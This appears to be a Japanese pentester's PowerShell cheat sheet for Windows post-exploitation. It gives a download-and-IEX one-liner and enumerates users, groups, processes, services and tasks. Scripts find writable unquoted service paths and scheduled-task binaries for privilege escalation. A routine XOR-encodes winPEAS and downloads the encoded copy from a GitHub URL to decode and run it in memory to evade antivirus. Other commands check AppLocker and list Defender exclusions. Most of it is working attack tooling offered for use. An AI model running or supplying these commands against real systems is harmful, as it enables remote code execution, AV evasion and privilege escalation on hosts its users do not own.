# Powershell

## ダウンロード＋実行
```
$wc=New-Object System.Net.WebClient; $wc.DownloadString("URL") | IEX;
```

## ユーザ
- ユーザの確認：
```
Get-LocalUser
net user /domain
```

- グループの確認：
```
Get-LocalGroup
net group /domain
		
Get-ADGroupMember -Identity [グループ名] -Server [DCホスト名]
Get-LocalGroupMember Administrators
```
		
- ログインしているユーザ：
```
qwinsta
```

## プロセス
- プロセス一覧の表示：
```
Get-WmiObject Win32_Process | where {$_.ProcessName -notlike "svchost*" } | select processid,name,@{Label="Owner";Expression={$_.GetOwner().User}},commandline | ft -AutoSize
		
Get-Process -IncludeUserName
```

- インストールされているソフトウェアの確認：
```
Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

- 自動起動プロセスの確認：
```
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```

## サービス
- サービス一覧の表示：
```
Get-Service | ft -AutoSize
Get-WmiObject -Class Win32_Service |  ForEach-Object { "$($_.Name) : $($_.PathName)" }
```
		
- Unquated Pathの列挙：
```
Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notmatch '"' -and $_.PathName -notlike "*svchost*" } | ForEach-Object { if ($_.PathName -match '^(.*?\.exe)') {$matches[1]} }
```		

- 書き換え可能なUnquated Pathの列挙：
```
$services = Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notmatch '"' -and $_.PathName -notlike "*svchost*" } | ForEach-Object { if ($_.PathName -match '^(.*?\.exe)') {$matches[1]} }; 
foreach($service in $services) {icacls $service | ForEach-Object { if((($_ -match "\(F\)") -or ($_ -match "\(M\)") -or ($_ -match "\(W\)")) -and (($_ -notmatch "Administrator") -and ($_ -notmatch "NT AUTHORITY\\SYSTEM") -and ($_ -notmatch "NT SERVICE\\TrustedInstaller"))) {$service; $_} }}
```

## タスク
- スケジュールタスクの列挙：
```
schtasks /query /fo list /v | Select-String "タスク名" | ForEach-Object { ($_ -split ":")[1].Trim() | Where-Object {$_ -notmatch "\\Microsoft"} }
			
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```			
	
- スケジュールタスクの詳細情報確認：
```
schtasks /query /tn [タスク名] /fo list /v
```
	
- スケジュールタスクのバイナリ列挙：
```
$tasknames = schtasks /query /fo list /v | Select-String "タスク名" | ForEach-Object { ($_ -split ":")[1].Trim() | Where-Object {$_ -notmatch "\\Microsoft"} }
$tasknames | ForEach-Object { schtasks /query /tn "$_" /fo list /v } | Select-String "実行するタスク" | ForEach-Object {($_ -split ": ")[1].Trim()}
```			
		
- 書き換え可能なスケジュールタスクの列挙：
```
$tasknames = schtasks /query /fo list /v | Select-String "タスク名" | ForEach-Object { ($_ -split ":")[1].Trim() | Where-Object {$_ -notmatch "\\Microsoft"} }
$runtasks = $tasknames | ForEach-Object { schtasks /query /tn "$_" /fo list /v } | Select-String "実行するタスク" | ForEach-Object {($_ -split ": ")[1].Trim()}
$filepath = $runtasks | ForEach-Object {if (($_ -match '^"?(.*?\.exe)') -or ($_ -match '^"?(.*?\.bat)') ) {$matches[1]} }
foreach($file in $filepath) {icacls $file | ForEach-Object { if((($_ -match "\(F\)") -or ($_ -match "\(M\)") -or ($_ -match "\(W\)")) -and (($_ -notmatch "Administrator") -and ($_ -notmatch "NT AUTHORITY\\SYSTEM"))) {$file; $_} }}
```

## エンコード
- PowerShellスクリプトをXORエンコード：
```
# ダウンロードするスクリプトファイルのURL
$url = "https://raw.githubusercontent.com/peass-ng/PEASS-ng/refs/heads/master/winPEAS/winPEASps1/winPEAS.ps1"

# WebClientオブジェクトを作成してファイルをダウンロード（テキストファイル）
$webClient = New-Object System.Net.WebClient
$fileContent = $webClient.DownloadString($url)

# XORキーの設定
$key = [System.Text.Encoding]::ASCII.GetBytes("testforyou")
$keyLength = $key.Length

# XORエンコード処理
$encodedContent = ""
for ($i = 0; $i -lt $fileContent.Length; $i++) {
    # 各文字をXOR演算で変換
    $encodedContent += [char]($fileContent[$i] -bxor $key[$i % $keyLength])
}
		
# エンコードされた内容をメモリに保持（ここでは文字列として保存）
$encodedContent | Out-File -FilePath wp.txt
```

- XORエンコードしたファイルをメモリにダウンロードし実行：
```
# エンコードされたスクリプトファイルのURL
$encodedUrl = "https://raw.githubusercontent.com/ishidanow/memo/refs/heads/main/wp.txt"

# エンコードされたスクリプトをダウンロード
$encodedContent = $webClient.DownloadString($encodedUrl)

# XORキーの設定（エンコード時と同じキー）
$key = [System.Text.Encoding]::ASCII.GetBytes("testforyou")
$keyLength = $key.Length

# XORデコード処理
$decodedContent = ""
for ($i = 0; $i -lt $encodedContent.Length; $i++) {
    # 各文字をXOR演算で復号
    $decodedContent += [char]($encodedContent[$i] -bxor $key[$i % $keyLength])
}

IEX $decodedContent
```

## AppLocker
- CLMのチェック：
```
$ExecutionContext.SessionState.LanguageMode
```
	
- AppLockerポリシーの確認：
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

## AV
- 除外フォルダの列挙：
```
(Get-MpPreference).ExclusionPath
```
